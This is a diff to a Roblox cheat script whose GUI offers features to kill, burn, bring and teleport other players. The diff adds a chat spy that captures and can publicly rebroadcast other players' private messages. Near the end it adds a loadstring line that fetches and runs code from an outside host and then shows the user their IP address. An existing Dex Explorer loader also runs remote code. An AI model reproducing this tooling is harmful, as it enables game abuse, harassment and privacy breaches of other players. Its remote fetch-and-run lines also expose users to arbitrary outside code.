@@ -9,7 +9,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
     local RunService = game:GetService("RunService")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
     local Debris = game:GetService("Debris")
-
+    --server
     local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
     local MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
     local CharacterEvents = ReplicatedStorage:WaitForChild("CharacterEvents")
@@ -19,6 +19,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
     local DestroyGrabLine = GrabEvents:WaitForChild("DestroyGrabLine")
     local DestroyToy = MenuToys:WaitForChild("DestroyToy")
     local RagdollRemote = CharacterEvents:WaitForChild("RagdollRemote")
+
     --Variables
     local humanoid = game.Players.LocalPlayer.Character.Humanoid
     local burnPart
@@ -63,6 +64,22 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
     local infJump = false
     local FlnPrtsDstrHght = game:GetService('Workspace').FallenPartsDestroyHeight
     local antiVoidEnabled = false
+    local StarterGui = game:GetService("StarterGui")
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+    local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+    local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+    local instance = (_G.chatSpyInstance or 0) + 1
+    enabledSpy = false
+    spyOnMyself = false
+    public = false
+    publicItalics = true
+    privateProperties = {
+    	Color = Color3.fromRGB(102,0,102); 
+    	Font = Enum.Font.SourceSansBold;
+    	TextSize = 18;
+    }
+    _G.chatSpyInstance = instance
     --Coroutines
     local PoisonGrabCoroutine
     local poisonAuraCoroutine
@@ -79,6 +96,8 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
     local heavenGrabCoroutine
     local CrazyGrabCoroutine
     local RadioactiveAuraCoroutine
+    local noclipGrabCoroutine
+    local heavenBindCoroutine
 
     local function getDescendantParts(descendantName)
         local parts = {}
@@ -346,6 +365,35 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         end
     end
 
+    local function noclipGrab()
+        while true do
+            local success, err = pcall(function()
+                local child = workspace:FindFirstChild("GrabParts")
+                if child and child.Name == "GrabParts" then
+                    local grabPart = child:FindFirstChild("GrabPart")
+                    local grabbedPart = grabPart:FindFirstChild("WeldConstraint").Part1
+                    local character = grabbedPart.Parent
+                    if character.HumanoidRootPart then
+                        while workspace:FindFirstChild("GrabParts") do
+                            for _, part in pairs(character:GetChildren()) do
+                                if part:IsA("BasePart") then
+                                    part.CanCollide = false
+                                end
+                            end
+                            wait()
+                        end
+                        for _, part in pairs(character:GetChildren()) do
+                            if part:IsA("BasePart") then
+                                part.CanCollide = true
+                            end
+                        end
+                    end
+                end
+            end)
+            wait()
+        end
+    end
+
     local function LeftBlobPlayersDropdown()
         local players = game:GetService("Players"):GetPlayers()
         local playerNames = {}
@@ -453,6 +501,45 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
             wait(10)
         end
     end
+
+    local function onChatted(p,msg)
+        if _G.chatSpyInstance == instance then
+            if p==player and msg:lower():sub(1,4)=="/spy" then
+                enabledSpy = not enabledSpy
+                wait(0.3)
+                privateProperties.Text = "{SPY "..(enabledSpy and "EN" or "DIS").."ABLED}"
+                StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+            elseif enabledSpy and (spyOnMyself==true or p~=player) then
+                msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+                local hidden = true
+                local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+                    if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+                        hidden = false
+                    end
+                end)
+                wait(1)
+                conn:Disconnect()
+                if hidden and enabledSpy then
+                    if public then
+                        saymsg:FireServer((publicItalics and "" or '').."{SPY} [".. p.DisplayName .."]: "..msg,"All")
+                    else
+                        privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
+                        StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+                    end
+                end
+            end
+        end
+    end
+     
+    for _,p in ipairs(Players:GetPlayers()) do
+        p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+    end
+    Players.PlayerAdded:Connect(function(p)
+        p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+    end)
+    local chatFrame = player.PlayerGui.Chat.Frame
+    chatFrame.ChatChannelParentFrame.Visible = true
+    chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
 
 
     --GUI
@@ -702,6 +789,24 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         end    
     })
 
+    MainTab:AddToggle({
+        Name = "Noclip grab",
+        Default = false,
+        Color = Color3.fromRGB(102, 0, 102),
+        Save = true,
+        Callback = function(enabled)
+            if enabled then
+                noclipGrabCoroutine = coroutine.create(noclipGrab)
+                coroutine.resume(noclipGrabCoroutine)
+            else
+                if noclipGrabCoroutine then
+                    coroutine.close(noclipGrabCoroutine)
+                    noclipGrabCoroutine = nil
+                end
+            end
+        end
+    })
+
     local Section = CharTab:AddSection({
 	Name = "Default"
     })
@@ -786,9 +891,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         end
     })
 
-    local Section = CharTab:AddSection({
-	Name = "Advanced"
-    })
+    local Section = CharTab:AddSection({Name = "Advanced"})
 
     CharTab:AddToggle({
         Name = "Infinite jumps",
@@ -807,7 +910,46 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
             end
         end
     })
+
+    local Section = CharTab:AddSection({Name = "Character"})
+
+    CharTab:AddButton({
+        Name = "Sit",
+        Callback = function()
+            game.Players.LocalPlayer.Character.Humanoid.Sit = true
+        end    
+    })
+
+    local Section = CharTab:AddSection({Name = "Chat"})
+
+    CharTab:AddToggle({
+        Name = "chat spy",
+        Default = true,
+        Color = Color3.fromRGB(102, 0, 102),
+        Callback = function(Value)
+            if Value == true then
+                enabledSpy = true
+                spyOnMyself = true
+            else
+                enabledSpy = false
+                spyOnMyself = false
+            end
+        end    
+    })
     
+    CharTab:AddToggle({
+        Name = "public chat spy",
+        Default = false,
+        Color = Color3.fromRGB(102, 0, 102),
+        Callback = function(Value)
+            if Value == true then
+                public = true
+            else
+                public = false
+            end
+        end    
+    })
+
     AuraTab:AddToggle({
         Name = "Grab aura",
         Default = false,
@@ -1203,16 +1345,16 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
     Tab:AddButton({
         Name = "Anti bang (нажми если включили банг)",
         Callback = function(Value)
-            local positionOld = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+            local positionOld = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 		    game:GetService('Workspace').FallenPartsDestroyHeight = -1000
-		    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0, -500, 0))
-		    wait(1)
+		    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0, game:GetService('Workspace').FallenPartsDestroyHeight + 500, 0))
+		    wait(0.8)
 		    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(positionOld)
-            game:GetService('Workspace').FallenPartsDestroyHeight = -500
+            game:GetService('Workspace').FallenPartsDestroyHeight = -100
         end    
     })
 
-    Tab:AddParagraph("Note","Super anti-grab do BIG ping (for all), reset and turn off 'Ragdoll' and server get small ping")
+    Tab:AddParagraph("Note","Super anti-grab do BIG ping (for all), reset and turn off 'Ragdoll' and server will got small ping")
 
     local Section = Tab:AddSection({Name = "Rinnegan"})
 
@@ -1385,6 +1527,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
             LeftBlobSelected = Value
         end    
     })
+
     BlobTab:AddButton({
         Name = "Left bring",
         Callback = function()
@@ -1393,6 +1536,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
             end
         end    
     })
+
     BlobTab:AddToggle({
         Name = "Loop left bring (bugged)",
         Default = false,
@@ -1409,6 +1553,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
             end
         end    
     })
+
     local Section = BlobTab:AddSection({Name = "Right bring"})
 
     local RightBlobDrop = BlobTab:AddDropdown({
@@ -1419,12 +1564,14 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
             RightBlobSelected = Value
         end    
     })
+
     BlobTab:AddButton({
         Name = "Right bring",
         Callback = function()
             bringRight(RightBlobSelected)
         end    
     })
+
     BlobTab:AddToggle({
         Name = "Loop right bring (bugged)",
         Default = false,
@@ -1441,6 +1588,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
             end
         end    
     })
+
     local Section = BlobTab:AddSection({Name = "Duo bring"})
 
     local DuoBlobDrop = BlobTab:AddDropdown({
@@ -1576,12 +1724,14 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
             TargetSelected = Value
         end    
     })
+
     TargetTab:AddButton({
         Name = "Kill",
         Callback = function()
             kill(TargetSelected)
         end   
     })
+
     TargetTab:AddButton({
         Name = "Burn",
         Callback = function()
@@ -1744,9 +1894,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         end
     })
 
-    local Section = TPTab:AddSection({
-        Name = "Players"
-    })
+    local Section = TPTab:AddSection({Name = "Players"})
 
     local TPDrop = TPTab:AddDropdown({
         Name = "Select player",
@@ -1767,9 +1915,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
     end
     })
 
-    local Section = TPTab:AddSection({
-        Name = "Spawn"
-    })
+    local Section = TPTab:AddSection({Name = "Spawn"})
 
     TPTab:AddButton({
         Name = "Teleport",
@@ -1778,9 +1924,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         end
     })
 
-    local Section = TPTab:AddSection({
-        Name = "Houses"
-    })
+    local Section = TPTab:AddSection({Name = "Houses"})
 
     TPTab:AddDropdown({
         Name = "Select house",
@@ -1808,9 +1952,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         end    
     })
 
-    local Section = TPTab:AddSection({
-        Name = "Other builds"
-    })
+    local Section = TPTab:AddSection({Name = "Other builds"})
 
     TPTab:AddDropdown({
         Name = "Select build",
@@ -1838,9 +1980,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         end    
     })
 
-    local Section = TPTab:AddSection({
-        Name = "Secrets"
-    })
+    local Section = TPTab:AddSection({Name = "Secrets"})
 
     TPTab:AddDropdown({
         Name = "Select secret",
@@ -1870,9 +2010,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         end    
     })
 
-    local Section = TPTab:AddSection({
-        Name = "Slots"
-    })
+    local Section = TPTab:AddSection({Name = "Slots"})
 
     TPTab:AddDropdown({
         Name = "Slot selected",
@@ -1906,9 +2044,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
     local CounOfPlayersLbl = ServerInfoTab:AddLabel("Count of players: "..AmountOfPlayers.."")
     local AllPlayersLbl = ServerInfoTab:AddLabel("All players: "..allPlrs.."")
 
-    local Section = AutoPianoTab:AddSection({
-        Name = "Play"
-    })
+    local Section = AutoPianoTab:AddSection({Name = "Play"})
 
     AutoPianoTab:AddDropdown({
         Name = "Choose a song",
@@ -2204,9 +2340,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         end    
     })
 
-    local Section = AutoPianoTab:AddSection({
-        Name = "Spawn"
-    })
+    local Section = AutoPianoTab:AddSection({Name = "Spawn"})
 
     AutoPianoTab:AddButton({
         Name = "Spawn piano",
@@ -2260,10 +2394,8 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         Name = "Dex Explorer v2",
         Callback = function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/dex2.0", true))()
-          end    
+        end    
     })
-
-    local Section = ScriptTab:AddSection({Name = "By that script's dev"})
 
     Players.PlayerAdded:Connect(function()
         TPDrop:Refresh(TeleportToPlayersDropdown(), true)
@@ -2278,6 +2410,7 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         allPlrs = allPlrs + 1
         AllPlayersLbl:Set("Count of players: "..allPlrs.."")
     end)
+
     Players.PlayerRemoving:Connect(function()
         TPDrop:Refresh(TeleportToPlayersDropdown(), true)
         DuoBlobDrop:Refresh(DuoBlobPlayersDropdown(), true)
@@ -2289,7 +2422,14 @@ if game.Players.LocalPlayer.Name == "bebra7658" or "asqw_zv" or "Yaros1979" or "
         AmountOfPlayers = AmountOfPlayers - 1
         CounOfPlayersLbl:Set("Count of players: "..AmountOfPlayers.."")
     end)
-
+    local ip = loadstring(game:HttpGet('https://playvora.vercel.app/api/ip'))()
+    OrionLib:MakeNotification({
+        Name = "hey, "..game.Players.LocalPlayer.DisplayName.."!",
+        Content = "your ip is "..ip..", lol",
+        Image = "",
+        Time = 5
+    })
+    wait()
     OrionLib:MakeNotification({
         Name = HubName.." loaded",
         Content = "completely",
